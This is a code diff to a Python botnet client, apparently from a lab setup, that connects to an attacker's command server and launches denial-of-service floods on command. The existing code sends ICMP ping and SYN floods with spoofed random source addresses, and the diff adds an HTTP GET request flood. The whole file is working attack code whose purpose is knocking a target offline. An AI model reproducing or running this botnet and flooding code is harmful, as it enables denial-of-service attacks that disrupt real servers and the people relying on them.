@@ -6,24 +6,30 @@ import sys
 import threading
 
 def fake_ip():
-	fakeip = '{}.{}.{}.{}'.format(*__import__('random').sample(range(0,255),4))
+	fakeip = '{}.{}.{}.{}'.format(*__import__('random').sample(range(0,255),4)) #Random IP
 	return fakeip
 
 def fake_port():
-	fakeport = random.randint(1024, 65535)
+	fakeport = random.randint(1024, 65535) #Random port number from 1024 - 65535
 	return fakeport
+
+def http_flood():
+	sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	sock2.connect((target_ip, target_port)) #Connect to server running website
+	byt = (f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n").encode()
+	sock2.send(byt)
 
 def option(data):
 	global target_ip, target_port, ddos_type, start_atk
 	if "DDoS".encode() in data:
-		target_ip = data.split("_".encode())[1].decode()
-		target_port = int(data.split("_".encode())[2].decode())
-		ddos_type = data.split("_".encode())[3].decode()
+		target_ip = data.split("_".encode())[1].decode() #Retrieved target IP from server
+		target_port = int(data.split("_".encode())[2].decode()) #Retrieved target port number from server
+		ddos_type = data.split("_".encode())[3].decode() #Retrieved which type of DDoS attack is to be done
 		start_atk = True
 		thrd = threading.Thread(target=ddos_atk)
 		thrd.start()
-		
-	elif "Stop".encode() in data or "Exit program".encode() in data:
+
+	elif "Stop".encode() in data:
 		start_atk = False
 
 def ddos_atk():
@@ -31,18 +37,14 @@ def ddos_atk():
 	print("Starting attack...")
 	while start_atk == True:
 		if ddos_type == "Ping":
-			source_port = fake_port()  # source port number
-				
 			ip_packet = IP()
 			ip_packet.src = fake_ip() # random IP address
 			ip_packet.dst = target_ip # target IP address
 			
 			ICMP_packet = ICMP()
-			ICMP_packet.sport = source_port # set source port
-			ICMP_packet.dport = target_port # set target port
 			send(ip_packet/ICMP_packet, verbose=0)
 			total += 1
-			print("Starting Ping Flood on " + target_ip + ":" + str(target_port) + " Number of packet sent: " + str(total))
+			print("Starting Ping Flood on " + target_ip + " Number of packet sent: " + str(total))
 
 		elif ddos_type == "SYN":
 			source_port = fake_port() # source port number
@@ -62,24 +64,27 @@ def ddos_atk():
 			send(ip_packet/TCP_packet, verbose=0)
 			total += 1
 			print("Starting SYN Flood on " + target_ip + ":" + str(target_port) + " Number of packet sent: " + str(total))
-	
+
+		elif ddos_type == "HTTP":
+			thrd2 = threading.Thread(target=http_flood())
+			thrd2.start()
+			print("Starting HTTP GET Request Flood on " + target_ip + ":" + str(target_port))
+
 	print("Stopping attack...")
-	
 
 target_ip = ""
 target_port = 0
 ddos_type = ""
 start_atk = False
 
-server_ip = "192.168.10.129" # Kali/Attacker's machine
+server_ip = "192.168.10.100" # Kali/Attacker's machine
 port = 9999 # Kali/Attacker's machine listening port
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.connect((server_ip, port))
+sock.connect((server_ip, port)) #Connect to attacker's machine
 print("Connected successfully!")
 
 while True:
 	info = "".encode()
-
 	while info != "Exit program".encode():
 		info = sock.recv(1024)
 		option(info)
